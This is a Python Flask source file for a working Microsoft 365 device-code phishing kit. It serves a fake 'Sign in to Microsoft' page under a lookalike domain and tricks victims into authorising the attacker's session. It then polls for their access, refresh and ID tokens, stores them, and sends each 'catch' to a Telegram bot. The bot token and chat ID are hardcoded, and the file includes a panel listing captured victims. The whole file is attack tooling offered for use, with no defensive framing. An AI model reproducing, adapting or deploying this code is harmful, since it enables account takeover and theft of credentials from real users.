import os
import re
import json
import time
import base64
import sqlite3
import threading
import signal
import requests
from flask import Flask, request, Response

UPSTREAM = "https://login.microsoftonline.com"
GRAPH = "https://graph.microsoft.com"
TELEGRAM_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT = "8877118461"
DB_PATH = "/tmp/phish.db"
APP_URL = "https://outlook-verify.onrender.com"

# Only first-party public clients preauthorized for Graph .default
CLIENT_IDS = [
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
    "ab9b8c07-8f02-4f72-87fa-80105867a763",  # OneDrive SyncEngine
]
CLIENT_ID_INDEX = 0

# Fixed scope - first-party clients are ALWAYS preauthorized for this
DEVICE_CODE_SCOPE = "https://graph.microsoft.com/.default offline_access openid profile"

app = Flask(__name__)

# ---------- DB ----------
def init_db():
    con = sqlite3.connect(DB_PATH)
    con.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_code TEXT,
        user_code TEXT,
        client_id TEXT,
        interval INTEGER,
        expires_at REAL,
        status TEXT,
        email TEXT,
        tokens TEXT,
        ts TEXT
    )""")
    con.commit()
    con.close()

init_db()

def db_add_session(device_code, user_code, client_id, interval, expires_at):
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO sessions (device_code, user_code, client_id, interval, expires_at, status, ts) VALUES (?,?,?,?,?,?,?)",
                (device_code, user_code, client_id, interval, expires_at, "pending",
                 time.strftime("%Y-%m-%d %H:%M:%S")))
    sid = con.execute("SELECT last_insert_rowid()").fetchone()[0]
    con.commit()
    con.close()
    return sid

def db_pending_sessions():
    con = sqlite3.connect(DB_PATH)
    rows = con.execute("SELECT id, device_code, client_id, interval, expires_at FROM sessions WHERE status='pending'").fetchall()
    con.close()
    return rows

def db_update_session(sid, **kw):
    con = sqlite3.connect(DB_PATH)
    for k, v in kw.items():
        con.execute(f"UPDATE sessions SET {k}=? WHERE id=?", (v, sid))
    con.commit()
    con.close()

def db_get_session(sid):
    con = sqlite3.connect(DB_PATH)
    row = con.execute("SELECT * FROM sessions WHERE id=?", (sid,)).fetchone()
    con.close()
    return row

# ---------- Telegram ----------
def send_telegram(text):
    try:
        # Chunk long messages (Telegram limit ~4096 chars)
        while len(text) > 4000:
            chunk = text[:4000]
            cut = chunk.rfind("\n")
            if cut > 500:
                chunk = text[:cut]
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT, "text": chunk},
                timeout=15
            )
            text = text[len(chunk):].lstrip("\n")
        if text:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT, "text": text},
                timeout=15
            )
    except Exception as e:
        print("Telegram error:", e)

def send_telegram_file(filename, content, caption=""):
    try:
        files = {"document": (filename, content.encode())}
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
            data={"chat_id": TELEGRAM_CHAT, "caption": caption},
            files=files,
            timeout=30
        )
    except Exception as e:
        print("Telegram file error:", e)

# ---------- Device code flow ----------
def request_device_code():
    global CLIENT_ID_INDEX
    for _ in range(len(CLIENT_IDS)):
        client_id = CLIENT_IDS[CLIENT_ID_INDEX]
        try:
            resp = requests.post(
                f"{UPSTREAM}/common/oauth2/v2.0/devicecode",
                data={"client_id": client_id, "scope": DEVICE_CODE_SCOPE},
                timeout=20
            )
            data = resp.json()
            if resp.status_code == 200 and "device_code" in data:
                return client_id, data
            else:
                print(f"[SESSION] client_id {client_id} failed: {data.get('error', resp.status_code)}")
                CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
        except Exception as e:
            print(f"[SESSION] client_id {client_id} exception: {e}")
            CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
    return None, None

def decode_id_token(id_token):
    try:
        payload = id_token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload))
        return data.get("preferred_username") or data.get("email") or data.get("upn") or "unknown"
    except Exception:
        return "unknown"

# ---------- Worker ----------
def poll_worker():
    print("[WORKER] poll_worker started")
    while not shutdown_event.is_set():
        try:
            for sid, device_code, client_id, interval, expires_at in db_pending_sessions():
                if time.time() > expires_at:
                    db_update_session(sid, status="expired")
                    print(f"[WORKER] session {sid} expired")
                    continue
                try:
                    resp = requests.post(
                        f"{UPSTREAM}/common/oauth2/v2.0/token",
                        data={
                            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                            "client_id": client_id,
                            "device_code": device_code,
                        },
                        timeout=20
                    )
                    data = resp.json()
                except Exception as e:
                    print(f"[WORKER] poll error session {sid}: {e}")
                    continue

                if "access_token" in data:
                    email = decode_id_token(data.get("id_token", ""))
                    tokens = {
                        "access_token": data.get("access_token"),
                        "refresh_token": data.get("refresh_token"),
                        "id_token": data.get("id_token"),
                    }
                    db_update_session(sid, status="caught", email=email, tokens=json.dumps(tokens))
                    msg = (f"\U0001F3C6 New catch!\n"
                           f"Email: {email}\n"
                           f"Session: {sid}\n"
                           f"Access Token:\n{tokens['access_token']}\n\n"
                           f"Refresh Token:\n{tokens['refresh_token']}\n\n"
                           f"ID Token:\n{tokens['id_token']}")
                    if len(msg) > 4000:
                        send_telegram(f"\U0001F3C6 New catch! Email: {email} (tokens attached)")
                        send_telegram_file("tokens.txt", json.dumps(tokens, indent=2), f"Catch for {email}")
                    else:
                        send_telegram(msg)
                    print(f"[WORKER] session {sid} caught email={email}")
                elif data.get("error") == "authorization_pending":
                    pass
                elif data.get("error") == "slow_down":
                    time.sleep(5)
                elif data.get("error") == "expired_token":
                    db_update_session(sid, status="expired")
                    print(f"[WORKER] session {sid} token expired")
                elif data.get("error") in ("authorization_declined", "invalid_grant"):
                    db_update_session(sid, status="declined")
                    print(f"[WORKER] session {sid} declined")
        except Exception as e:
            print(f"[WORKER] loop error: {e}")
        shutdown_event.wait(timeout=3)
    print("[WORKER] poll_worker stopped")

shutdown_event = threading.Event()

# ---------- Page ----------
def render_page(user_code, verify_url):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to Microsoft</title>
<style>
  html,body{{margin:0;padding:0;min-height:100vh;background:#fff;font-family:'Segoe UI',Arial,sans-serif;}}
  .outer{{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;}}
  .logo{{width:108px;margin-bottom:24px;}}
  .box{{max-width:440px;width:100%;padding:44px 40px 36px;}}
  h1{{font-size:24px;font-weight:600;color:#1b1b1b;margin:0 0 12px;}}
  p{{font-size:15px;color:#1b1b1b;line-height:1.5;margin:0 0 16px;}}
  .code{{font-size:26px;font-weight:700;letter-spacing:2px;color:#0067b8;margin:20px 0 24px;text-align:center;}}
  .btn{{width:100%;padding:10px 12px;background:#0067b8;color:#fff;border:none;border-radius:4px;font-size:15px;cursor:pointer;font-family:inherit;}}
  .btn:hover{{background:#005da6;}}
  .hint{{margin-top:24px;font-size:13px;color:#666;}}
</style>
</head>
<body>
<div class="outer">
  <div class="box">
    <svg class="logo" viewBox="0 0 96 72" xmlns="http://www.w3.org/2000/svg"><path fill="#F25022" d="M0 0h45v45H0z"/><path fill="#7FBA00" d="M51 0h45v45H51z"/><path fill="#00A4EF" d="M0 51h45v21H0z"/><path fill="#FFB900" d="M51 51h45v21H51z"/></svg>
    <h1>Enter the code to sign in</h1>
    <p>To sign in to Microsoft, enter this code on the verification page.</p>
    <div class="code">{user_code}</div>
    <button class="btn" onclick="go()">Continue</button>
    <p class="hint">You'll be redirected to microsoft.com/devicelogin to complete sign-in.</p>
  </div>
</div>
<script>
function go(){{
  navigator.clipboard.writeText("{user_code}").catch(function(){{}});
  setTimeout(function(){{ window.location.href = "{verify_url}"; }}, 250);
}}
</script>
</body>
</html>"""

# ---------- Routes ----------
@app.route("/", methods=["GET"])
def home():
    client_id, data = request_device_code()
    if not data:
        return "<h2>Service temporarily unavailable, please retry.</h2>", 503
    sid = db_add_session(
        data["device_code"], data["user_code"], client_id,
        data.get("interval", 5), time.time() + int(data.get("expires_in", 900))
    )
    print(f"[SESSION] new session {sid} user_code={data['user_code']}")
    return Response(render_page(data["user_code"], data["verification_uri"]), mimetype="text/html")

@app.route("/test_tg", methods=["GET"])
def test_tg():
    send_telegram("✅ Test message from your phishing app - Telegram works!")
    return "Telegram test sent - check your DMs."

@app.route("/catches", methods=["GET"])
def catches():
    con = sqlite3.connect(DB_PATH)
    rows = con.execute("SELECT id, email, status, ts FROM sessions ORDER BY id DESC LIMIT 50").fetchall()
    con.close()
    out = "<h2>Recent sessions</h2><table border=1 cellpadding=6><tr><th>ID</th><th>Email</th><th>Status</th><th>Time</th></tr>"
    for r in rows:
        out += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td></tr>"
    out += "</table>"
    return out

if __name__ == "__main__":
    t = threading.Thread(target=poll_worker, daemon=True)
    t.start()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
else:
    # Gunicorn import path
    t = threading.Thread(target=poll_worker, daemon=True)
    t.start()

def _shutdown(sig, frame):
    shutdown_event.set()
    raise SystemExit(0)

signal.signal(signal.SIGTERM, _shutdown)
signal.signal(signal.SIGINT, _shutdown)
